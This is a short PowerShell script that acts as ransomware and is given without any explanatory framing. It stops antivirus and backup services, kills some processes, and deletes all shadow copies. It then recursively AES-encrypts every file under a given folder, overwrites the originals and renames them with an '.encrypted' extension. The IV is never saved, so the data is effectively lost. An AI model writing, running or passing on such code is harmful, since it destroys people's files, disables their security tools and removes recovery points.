# Define the path to the folder containing the files you want to encrypt
$folderPath = $args[0]

Invoke-Expression -Command "taskkill.exe /F /FI SyncBackFree.exe" -ErrorAction SilentlyContinue
Invoke-Expression -Command "taskkill.exe /F /FI msedge.exe" -ErrorAction SilentlyContinue
Invoke-Expression -Command "taskkill.exe /F /FI SecurityHeathService.exe" -ErrorAction SilentlyContinue
Invoke-Expression -Command "sc.exe stop Antivirus" -ErrorAction SilentlyContinue
Invoke-Expression -Command "sc.exe stop McShield" -ErrorAction SilentlyContinue
Invoke-Expression -Command "sc.exe stop BackupExecAgentAccelerator" -ErrorAction SilentlyContinue

# Delete shadow copies
Invoke-Expression -Command "vssadmin Delete Shadows /all /quiet"

# Generate a random encryption key
$encryptionKey = [System.Convert]::ToBase64String((1..32 | ForEach-Object { Get-Random -Minimum 0 -Maximum 256 }))

# Function to encrypt a file
function Encrypt-File($file) {
    $content = Get-Content -Path $file.FullName -Raw
    $contentBytes = [System.Text.Encoding]::UTF8.GetBytes($content)
    $aesProvider = [System.Security.Cryptography.AesManaged]::Create()
    $aesProvider.Key = [System.Convert]::FromBase64String($encryptionKey)
    $aesProvider.GenerateIV()

    $memoryStream = New-Object System.IO.MemoryStream
    $cryptoStream = New-Object System.Security.Cryptography.CryptoStream $memoryStream, $aesProvider.CreateEncryptor(), "Write"
    $cryptoStream.Write($contentBytes, 0, $contentBytes.Length)
    $cryptoStream.FlushFinalBlock()
    $encryptedBytes = $memoryStream.ToArray()

    $cryptoStream.Close()
    $memoryStream.Close()

    $encryptedContent = [System.Convert]::ToBase64String($encryptedBytes)
    $encryptedContent | Set-Content -Path $file.FullName -Encoding UTF8
    
    # $creationTime = Get-Date
    # $file.CreationTime = $creationTime

    $newFileName = $file.FullName + ".encrypted"
    Rename-Item -Path $file.FullName -NewName $newFileName -Force

    Write-Host "File $($file.Name) encrypted with key: $encryptionKey"
    Write-Host "IV (Initialization Vector): " -NoNewline
    Write-Host $aesProvider.IV
}

# Function to encrypt files in a directory and its subdirectories
function Encrypt-FilesRecursive($directory) {
    $files = Get-ChildItem -Path $directory -File
    foreach ($file in $files) {
        Encrypt-File $file
    }

    $subdirectories = Get-ChildItem -Path $directory -Directory

    foreach ($subdirectory in $subdirectories) {
        Encrypt-FilesRecursive $subdirectory.FullName
    }
}

Encrypt-FilesRecursive $folderPath
